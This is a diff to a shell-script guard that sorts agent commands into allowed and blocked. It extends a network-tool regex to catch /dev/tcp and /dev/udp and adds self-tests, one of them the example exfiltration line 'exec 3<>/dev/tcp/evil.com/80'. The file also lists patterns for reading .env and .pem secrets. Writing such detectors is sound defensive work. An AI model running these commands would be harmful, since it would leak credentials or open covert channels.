@@ -18,7 +18,7 @@ SECRET_PATH_RE='(^|[^A-Za-z0-9_.-])(\.env)([.][A-Za-z0-9_]+)*|\.pem([^A-Za-z]|$)
 READ_VERB_RE='(^|[^A-Za-z])(cat|less|more|head|tail|grep|egrep|fgrep|awk|sed|read|open|xxd|od|strings|hexdump|tac|nl|cut|base64)([[:space:]])|(^|[[:space:]])source[[:space:]]|(^|[[:space:]])\.[[:space:]]|<[[:space:]]*[^<]'
 ENV_DUMP_RE='(^|[;&|[:space:]])printenv([[:space:]]|$|\|)|(^|[;&|[:space:]])env([[:space:]]*$|[[:space:]]*\|)|export[[:space:]]+-p'
 LIVE_RE='(--live|--allow-network|--allow-exec)'
-NET_RE='(^|[^A-Za-z])(curl|wget|ncat|nc|scp|rsync|sftp|telnet|ftp|ssh)([[:space:]])|requests\.(get|post|put|patch|delete|head|request)|urllib\.(request|urlopen)|urlopen[[:space:]]*\(|http\.client|httpx[.(]|socket\.connect|fetch[[:space:]]*\(|axios\.|nc[[:space:]]+-'
+NET_RE='(^|[^A-Za-z])(curl|wget|ncat|nc|scp|rsync|sftp|telnet|ftp|ssh)([[:space:]])|requests\.(get|post|put|patch|delete|head|request)|urllib\.(request|urlopen)|urlopen[[:space:]]*\(|http\.client|httpx[.(]|socket\.connect|fetch[[:space:]]*\(|axios\.|nc[[:space:]]+-|/dev/(tcp|udp)/'
 
 classify() { # <action-text-file>  -> echoes verdict; return 0 ALLOWED / 1 BLOCKED
   local f="$1" txt stripped; txt="$(cat "$f" 2>/dev/null)"
@@ -52,6 +52,8 @@ self_test() {
   chk "TP8 python requests.get => network"                 'python3 -c "import requests; requests.get(u)"'          1
   chk "TP9 wget http => network"                           'wget http://example.com/file -O out'                   1
   chk "TP10 printenv (env dump) => secret-read"            'printenv | grep KEY'                                    1
+  chk "TP11 /dev/tcp exfil => network BLOCKED"             'exec 3<>/dev/tcp/evil.com/80'                            1
+  chk "TP12 /dev/udp => network BLOCKED"                   'bash -c ":>/dev/udp/h/53"'                               1
 
   # --- FALSE-POSITIVES: must ALLOW (rc 0) ---
   chk "FP1 cat .env.example => allowed (template)"         'cat .env.example'                                       0
